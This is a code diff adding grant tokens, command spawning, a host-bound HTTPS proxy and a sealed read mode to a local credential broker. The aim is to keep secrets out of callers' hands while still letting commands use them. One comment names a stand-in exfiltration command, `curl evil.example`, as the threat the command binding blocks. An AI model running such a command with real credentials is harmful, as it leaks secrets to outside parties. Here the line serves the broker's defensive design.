@@ -56,8 +56,9 @@ import subprocess
 import sys
 import threading
 import time
+import urllib.parse
 from pathlib import Path
-from typing import Any, Iterable, Mapping
+from typing import Any, Iterable, Mapping, Sequence
 
 import passbook
 import passbook_access as access
@@ -853,6 +854,366 @@ def _renew_one(grant: Mapping[str, Any], keys: Mapping[str, str], root: Path | N
 HTTP_REFRESH_WAIT = 30.0
 
 
+# ── grants: values that leave only inside a process we started ─────────────
+#
+# A grant is the record of one spawn: which keys went in, to what, when, and
+# whether it is still alive. It is what makes "this caller was born holding
+# these" a question with an answer, and it never leaves this process — the token
+# in a child's environment is a handle to a row here, not the row itself.
+
+_GRANTS: dict[str, dict[str, Any]] = {}
+_GRANT_LOCK = threading.Lock()
+
+# How long a grant stays valid for a child that asks us to top it up. A build
+# can legitimately take a while; a token that outlived the machine's uptime
+# would be a credential of its own.
+GRANT_TTL = 12 * 60 * 60
+
+
+def _safe_command(command: Sequence[str], values: Mapping[str, str] | None) -> list[str]:
+    """The command as it is safe to show, which is not always as it was written.
+
+    A command can carry a credential in its own argv — `curl -H "Bearer sk-…"`
+    is the shape half the internet's examples use. Recording it verbatim would
+    put the value in `passbook grants` and in the ledger, which are the two
+    surfaces whose whole promise is that they never contain one.
+    """
+    parts = [str(part) for part in command][:12]
+    if not values:
+        return parts
+    try:
+        import passbook_grant
+
+        return [passbook_grant.redact(part, values) for part in parts]
+    except ImportError:  # pragma: no cover - grants absent means no spawn either
+        return parts
+
+
+def _remember_grant(token: str, *, app: str, keys: Iterable[str], command: Sequence[str],
+                    pid: int | None, values: Mapping[str, str] | None = None) -> None:
+    with _GRANT_LOCK:
+        _reap_grants()
+        _GRANTS[token] = {
+            "app": app, "keys": sorted(set(keys)), "pid": pid,
+            "command": _safe_command(command, values),
+            "created": time.time(),
+        }
+
+
+def _reap_grants() -> None:
+    """Drop grants that have aged out. Called under the lock."""
+    cutoff = time.time() - GRANT_TTL
+    for token in [t for t, row in _GRANTS.items() if row["created"] < cutoff]:
+        _GRANTS.pop(token, None)
+
+
+def _grant_for(token: str) -> dict[str, Any] | None:
+    if not token:
+        return None
+    with _GRANT_LOCK:
+        _reap_grants()
+        row = _GRANTS.get(token)
+        return dict(row) if row else None
+
+
+def live_grants() -> list[dict[str, Any]]:
+    """What is currently holding credentials, by name. Never a value."""
+    with _GRANT_LOCK:
+        _reap_grants()
+        return [
+            {"app": row["app"], "keys": row["keys"], "pid": row["pid"],
+             "command": row["command"], "age_seconds": round(time.time() - row["created"], 1)}
+            for row in _GRANTS.values()
+        ]
+
+
+def reads_mode(policy: Mapping[str, Any]) -> str:
+    """Whether a caller we cannot place may receive plaintext at all.
+
+    `open` is what every version before grants did, and stays the default so an
+    upgrade does not brick a machine whose apps have not moved yet. `sealed` is
+    the guarantee: a value goes only into a process this broker started, and
+    anything else is told to ask for the *effect* instead.
+    """
+    wanted = str((policy.get("reads") or "open")).strip().lower()
+    return "sealed" if wanted == "sealed" else "open"
+
+
+def _placed(payload: Mapping[str, Any]) -> dict[str, Any] | None:
+    """The grant this caller was born under, if it was born under one."""
+    return _grant_for(str(payload.get("grant") or "").strip())
+
+
+def _use_refusal(key: str, *, guarded_key: bool) -> str:
+    if guarded_key:
+        return (f"{key} is guarded: it is only ever injected into a command or "
+                f"request, never returned. Use `passbook run` or the broker's "
+                f"spawn/proxy so the value stays out of your output.")
+    return (f"{key} is not returned to callers this broker did not start. "
+            f"Run what needs it with `passbook run -- <command>` instead.")
+
+
+def _resolve_values(keys: Iterable[str]) -> dict[str, str]:
+    """Open exactly these keys, here, inside the broker. Never sent onward."""
+    available = passbook.load()
+    return {key: available[key] for key in keys if available.get(key)}
+
+
+def _decide_many(keys: Iterable[str], *, app: str, policy: Mapping[str, Any],
+                 root: Path | None, workspace: str, project: str,
+                 reason: str) -> tuple[list[str], list[tuple[str, str]]]:
+    """Run every key past the same decision point `request` uses.
+
+    Shared so that spawning cannot become a way around a bound that a plain read
+    would have honoured. An `ask` here is answered exactly as it is there —
+    a person, once, for the whole batch.
+    """
+    allowed, refused, asked = [], [], []
+    for key in keys:
+        verdict = access.decide_key(app, key, policy, root=root,
+                                    workspace=workspace, project=project)
+        if verdict["outcome"] == "grant":
+            allowed.append(key)
+        elif verdict["outcome"] == "refuse":
+            refused.append((key, verdict["why"]))
+        else:
+            asked.append(key)
+    if asked:
+        request_id, event = _queue(app, asked, reason)
+        _record("ask", asked, app=app, granted=False, reason=reason or "waiting on approval")
+        decision = _await_decision(request_id, event)
+        if decision == "approve":
+            allowed.extend(asked)
+        else:
+            refused.extend((key, "declined" if decision == "deny" else "no answer in time")
+                           for key in asked)
+    return allowed, refused
+
+
+def _spawn(payload: Mapping[str, Any], root: Path | None,
+           caller: Mapping[str, Any] | None) -> dict[str, Any]:
+    """Run a command holding credentials, and answer with output that has none.
+
+    This is the door that replaces handing an agent a value. Everything the
+    plain read would check is checked here too — scope, project, audience, mode
+    — and then two more things a read never had to: whether each key is allowed
+    into *this* command, and whether what comes back still contains it.
+    """
+    try:
+        import passbook_grant
+    except ImportError:
+        return {"ok": False, "error": "grants are not installed on this machine"}
+
+    app = str(payload.get("app") or "").strip() or "unknown"
+    command = [str(part) for part in (payload.get("command") or []) if str(part) != ""]
+    if not command:
+        return {"ok": False, "error": "no command"}
+    wanted = [str(k).strip() for k in (payload.get("keys") or []) if str(k).strip()]
+    status = (caller or {}).get("status", "unknown")
+    reason = (str(payload.get("reason") or "")[:200] or f"ran {Path(command[0]).name}")
+    reason = f"{reason} [{status} caller]"
+    policy = read_policy(root)
+
+    allowed, refused = _decide_many(
+        wanted, app=app, policy=policy, root=root,
+        workspace=str(payload.get("workspace") or ""),
+        project=str(payload.get("project") or ""), reason=reason)
+
+    # The second bound, and the one a plain read never needed: a guarded key
+    # goes into the commands its owner named and no others. Without this, spawn
+    # would be a prettier `get` — the caller picks `curl evil.example` and the
+    # value leaves by the front door while our redaction scrubs an empty stdout.
+    keeping = []
+    for key in allowed:
+        verdict = passbook_grant.command_allowed(key, command, policy)
+        (keeping if verdict["allowed"] else refused).append(
+            key if verdict["allowed"] else (key, verdict["why"]))
+    allowed = keeping
+
+    values = _resolve_values(allowed)
+    missing = [key for key in allowed if key not in values]
+    if allowed:
+        _refresh_if_needed(allowed, root)
+        values = _resolve_values(allowed)
+
+    token = base64.urlsafe_b64encode(os.urandom(18)).decode("ascii").rstrip("=")
+    answer = passbook_grant.spawn(
+        command, values, app=app, cwd=str(payload.get("cwd") or ""),
+        extra_env=payload.get("env") if isinstance(payload.get("env"), Mapping) else None,
+        timeout=float(payload.get("timeout") or passbook_grant.DEFAULT_TIMEOUT),
+        detach=bool(payload.get("detach")), grant=token)
+
+    if answer.get("ok"):
+        _remember_grant(token, app=app, keys=values, command=command,
+                        pid=answer.get("pid"), values=values)
+        # `use`, not `read`: the distinction the whole module exists for. A row
+        # saying `read` would claim the caller received these, which is the one
+        # thing that did not happen.
+        _record("use", sorted(values) or ["*"], app=app, granted=True,
+                reason=f"{reason}: {' '.join(_safe_command(command, values))[:120]}")
+    if refused:
+        _record("denied", [key for key, _ in refused], app=app, granted=False,
+                reason="; ".join(sorted({why for _, why in refused}))[:200])
+
+    answer["denied"] = sorted(key for key, _ in refused)
+    answer["why"] = {key: why for key, why in refused}
+    answer["missing"] = sorted(missing)
+    return answer
+
+
+def _proxy(payload: Mapping[str, Any], root: Path | None,
+           caller: Mapping[str, Any] | None) -> dict[str, Any]:
+    """Make one HTTPS request with credentials filled in. The strongest form.
+
+    The value is never in an environment, an argv or a file — it exists inside
+    this process for the length of one request. A key must be bound to the host
+    before it will go there, because a proxy with an open destination list is an
+    exfiltration tool with a helpful name.
+    """
+    try:
+        import passbook_grant
+    except ImportError:
+        return {"ok": False, "error": "grants are not installed on this machine"}
+
+    app = str(payload.get("app") or "").strip() or "unknown"
+    url = str(payload.get("url") or "")
+    headers = payload.get("headers") if isinstance(payload.get("headers"), Mapping) else {}
+    body = payload.get("body")
+    body_text = "" if body is None else (body if isinstance(body, str) else json.dumps(body))
+    status = (caller or {}).get("status", "unknown")
+    reason = (str(payload.get("reason") or "")[:200] or "proxied a request")
+    reason = f"{reason} [{status} caller]"
+
+    wanted = passbook_grant.placeholders(
+        url, body_text, *[str(v) for v in headers.values()])
+    if not wanted:
+        return {"ok": False, "error": "no {{KEY}} placeholder in that request; "
+                                      "use a plain HTTP client if it needs no credential"}
+    policy = read_policy(root)
+    allowed, refused = _decide_many(
+        wanted, app=app, policy=policy, root=root,
+        workspace=str(payload.get("workspace") or ""),
+        project=str(payload.get("project") or ""), reason=reason)
+
+    keeping = []
+    for key in allowed:
+        verdict = passbook_grant.host_allowed(key, url, policy)
+        (keeping if verdict["allowed"] else refused).append(
+            key if verdict["allowed"] else (key, verdict["why"]))
+    allowed = keeping
+
+    if refused:
+        _record("denied", [key for key, _ in refused], app=app, granted=False,
+                reason="; ".join(sorted({why for _, why in refused}))[:200])
+        # Unlike a spawn, a partial proxy is not worth attempting: the request
+        # would go out with `{{KEY}}` sitting in a header, reach the far end as
+        # a malformed credential, and come back as an auth error nobody can
+        # trace to a policy refusal.
+        return {"ok": False, "error": "refused", "denied": sorted(k for k, _ in refused),
+                "why": {key: why for key, why in refused}}
+
+    _refresh_if_needed(allowed, root)
+    values = _resolve_values(allowed)
+    answer = passbook_grant.proxy(
+        {"url": url, "method": payload.get("method"), "headers": headers, "body": body},
+        values, timeout=float(payload.get("timeout") or 30.0))
+    if answer.get("ok"):
+        host = urllib.parse.urlparse(url).hostname or "?"
+        _record("use", sorted(values) or ["*"], app=app, granted=True,
+                reason=f"{reason}: {payload.get('method') or 'GET'} {host}")
+    return answer
+
+
+def _spawn_streaming(payload: Mapping[str, Any], root: Path | None,
+                     caller: Mapping[str, Any] | None, connection) -> None:
+    """Spawn, and send the child's output back as it arrives, already scrubbed.
+
+    `_spawn` waits for the child and answers once, which is right for a tool
+    call and wrong for a person: a four-minute build would sit silent and then
+    arrive all at once. But the obvious alternative — hand the caller the values
+    and let it do its own spawning — is precisely what this whole design exists
+    to prevent, and it does not stop being that because the caller is our own
+    CLI.
+
+    So the broker keeps the values and the caller gets the bytes. The reply is a
+    sequence of newline-delimited frames rather than one object: `out` and `err`
+    carry redacted output, and a final `end` carries the exit code. Anything
+    that cannot parse frames sees a single line it does not understand, which is
+    why this only happens when the caller asked for it by name.
+    """
+    def send(frame: dict[str, Any]) -> bool:
+        try:
+            connection.sendall((json.dumps(frame, separators=(",", ":")) + "\n").encode("utf-8"))
+            return True
+        except OSError:
+            return False  # the caller hung up; stop pumping
+
+    try:
+        import passbook_grant
+    except ImportError:
+        send({"t": "end", "ok": False, "error": "grants are not installed on this machine"})
+        return
+
+    app = str(payload.get("app") or "").strip() or "unknown"
+    command = [str(part) for part in (payload.get("command") or []) if str(part) != ""]
+    if not command:
+        send({"t": "end", "ok": False, "error": "no command"})
+        return
+    wanted = [str(k).strip() for k in (payload.get("keys") or []) if str(k).strip()]
+    status = (caller or {}).get("status", "unknown")
+    reason = f"{str(payload.get('reason') or '')[:200] or 'ran ' + Path(command[0]).name} [{status} caller]"
+    policy = read_policy(root)
+
+    allowed, refused = _decide_many(
+        wanted, app=app, policy=policy, root=root,
+        workspace=str(payload.get("workspace") or ""),
+        project=str(payload.get("project") or ""), reason=reason)
+    keeping = []
+    for key in allowed:
+        verdict = passbook_grant.command_allowed(key, command, policy)
+        (keeping if verdict["allowed"] else refused).append(
+            key if verdict["allowed"] else (key, verdict["why"]))
+    allowed = keeping
+
+    if allowed:
+        _refresh_if_needed(allowed, root)
+    values = _resolve_values(allowed)
+    token = base64.urlsafe_b64encode(os.urandom(18)).decode("ascii").rstrip("=")
+
+    if refused:
+        _record("denied", [key for key, _ in refused], app=app, granted=False,
+                reason="; ".join(sorted({why for _, why in refused}))[:200])
+    send({"t": "begin", "keys": sorted(values),
+          "denied": sorted(key for key, _ in refused),
+          "why": {key: why for key, why in refused},
+          "redacted": passbook_grant.redactions_for(values)})
+
+    class _Frames:
+        """Stands in for a text stream, turning writes into frames."""
+
+        def __init__(self, kind: str) -> None:
+            self.kind = kind
+
+        def write(self, text: str) -> None:
+            if text:
+                send({"t": self.kind, "d": text})
+
+        def flush(self) -> None:
+            return None
+
+    answer = passbook_grant.stream(
+        command, values, app=app, cwd=str(payload.get("cwd") or ""),
+        extra_env=payload.get("env") if isinstance(payload.get("env"), Mapping) else None,
+        grant=token, stdout=_Frames("out"), stderr=_Frames("err"))
+
+    if answer.get("ok"):
+        _remember_grant(token, app=app, keys=values, command=command, pid=None,
+                        values=values)
+        _record("use", sorted(values) or ["*"], app=app, granted=True,
+                reason=f"{reason}: {' '.join(_safe_command(command, values))[:120]}")
+    send({"t": "end", **answer})
+
+
 def _handle(payload: Mapping[str, Any], root: Path | None = None,
             caller: Mapping[str, Any] | None = None) -> dict[str, Any]:
     operation = str(payload.get("op") or "").strip().lower()
@@ -911,6 +1272,12 @@ def _handle(payload: Mapping[str, Any], root: Path | None = None,
                 "workspace": "" if every else target}
     if operation == "vault":
         return _vault_status(root)
+    if operation == "spawn":
+        return _spawn(payload, root, caller)
+    if operation == "proxy":
+        return _proxy(payload, root, caller)
+    if operation == "grants":
+        return {"ok": True, "grants": live_grants(), "reads": reads_mode(read_policy(root))}
     if operation != "request":
         return {"ok": False, "error": "unknown operation"}
 
@@ -952,6 +1319,37 @@ def _handle(payload: Mapping[str, Any], root: Path | None = None,
             refused.extend((key, "declined" if decision == "deny" else "no answer in time")
                            for key in asked)
 
+    # The last bound, and the only one about where the value GOES rather than
+    # who may have it. A caller this broker started is answered from the key set
+    # it was started with; anything else is offered the effect instead of the
+    # value. Applied after the ask, so a person is never prompted to approve a
+    # read that was going to be refused anyway.
+    placed = _placed(payload)
+    if allowed:
+        try:
+            import passbook_grant
+
+            guarded_keys = set(passbook_grant.guarded(policy))
+        except ImportError:
+            guarded_keys = set()
+        sealed = reads_mode(policy) == "sealed"
+        keeping = []
+        for key in allowed:
+            if placed is not None:
+                # A grant-backed caller gets exactly what its grant covers and
+                # nothing more. Widening here would make the token a credential
+                # of its own — steal it once, read the whole store forever.
+                if key in placed["keys"]:
+                    keeping.append(key)
+                else:
+                    refused.append((key, f"{key} is not part of the grant this process was started with"))
+                continue
+            if key in guarded_keys or sealed:
+                refused.append((key, _use_refusal(key, guarded_key=key in guarded_keys)))
+                continue
+            keeping.append(key)
+        allowed = keeping
+
     if allowed:
         # Before reading: renew any sign-in among these keys that is about to
         # expire, so what the caller receives actually works.
@@ -992,7 +1390,14 @@ def _serve_one(connection: socket.socket, root: Path | None) -> None:
         raw = b"".join(chunks).decode("utf-8").strip()
         if not raw:
             return
-        answer = _handle(json.loads(raw), root, _caller(connection))
+        payload = json.loads(raw)
+        if str(payload.get("op") or "") == "spawn" and payload.get("stream"):
+            # Answers in frames rather than one object, and for as long as the
+            # child runs. It writes to the connection itself and there is
+            # nothing left to send afterwards.
+            _spawn_streaming(payload, root, _caller(connection), connection)
+            return
+        answer = _handle(payload, root, _caller(connection))
     except (OSError, ValueError, UnicodeDecodeError):
         answer = {"ok": False, "error": "bad request"}
     except Exception as error:  # noqa: BLE001 — see below
@@ -1099,6 +1504,69 @@ def _ask(payload: Mapping[str, Any], *, root: Path | None = None, timeout: float
         return None
 
 
+def spawn_streaming(command: Sequence[str], keys: Iterable[str], *, app: str,
+                    cwd: str = "", reason: str = "", project: str = "",
+                    out=None, err=None, root: Path | None = None) -> dict[str, Any] | None:
+    """Have the broker run a command, writing its scrubbed output here as it comes.
+
+    The client end of `_spawn_streaming`. Returns the final frame, or None when
+    there is no broker to ask — None meaning "not available", never "refused",
+    because a caller that conflated those would fall back to running the command
+    with no credentials and report a policy decision as a missing key.
+    """
+    out = sys.stdout if out is None else out
+    err = sys.stderr if err is None else err
+    payload = {
+        "op": "spawn", "stream": True, "app": app, "command": list(command),
+        "keys": list(keys), "reason": reason, "project": project,
+        # The child belongs where the caller is standing, not where the daemon
+        # was started. Without these it runs in the broker's cwd with the
+        # broker's PATH, which breaks every relative path and every tool
+        # installed since the daemon came up.
+        "cwd": cwd or os.getcwd(),
+        "env": {name: value for name, value in os.environ.items()
+                if value and name != "PASSBOOK_GRANT"},
+    }
+    try:
+        # No overall deadline: the child decides how long this takes, and a
+        # timeout here would kill a legitimate build at an arbitrary minute.
+        with _dial(root, None) as client:
+            client.sendall((json.dumps(payload, separators=(",", ":")) + "\n").encode("utf-8"))
+            final: dict[str, Any] = {}
+            buffer = b""
+            done = False
+            while not done:
+                chunk = client.recv(65536)
+                if not chunk:
+                    break
+                buffer += chunk
+                while b"\n" in buffer:
+                    line, buffer = buffer.split(b"\n", 1)
+                    if not line.strip():
+                        continue
+                    frame = json.loads(line.decode("utf-8"))
+                    kind = frame.get("t")
+                    if kind == "out":
+                        out.write(frame.get("d", ""))
+                        out.flush()
+                    elif kind == "err":
+                        err.write(frame.get("d", ""))
+                        err.flush()
+                    elif kind == "begin":
+                        final["begin"] = frame
+                    elif kind == "end":
+                        # The end frame IS the answer, not a hint that one is
+                        # coming. Reading on until the socket closes instead —
+                        # which the first version did — hangs for as long as the
+                        # server takes to get round to closing it, and every run
+                        # sat there having already printed everything it had.
+                        final.update(frame)
+                        done = True
+            return final or None
+    except (OSError, ValueError, UnicodeDecodeError):
+        return None
+
+
 def running(*, root: Path | None = None) -> bool:
     answer = _ask({"op": "ping"}, root=root, timeout=1.0)
     return bool(answer and answer.get("ok"))
@@ -1128,6 +1596,11 @@ def request_through_broker(
     answer = _ask({
         "op": "request", "app": app, "keys": list(keys),
         "reason": reason, "workspace": workspace_id, "project": here,
+        # Proof of birth, not of identity: a process the broker spawned carries
+        # the token it was spawned with, and gets answered from that grant's key
+        # set. Everything else is an unplaced caller and, in sealed mode, is
+        # offered `spawn` rather than a value.
+        "grant": os.environ.get("PASSBOOK_GRANT", ""),
     }, root=root)
     if not answer or not answer.get("ok"):
         return None
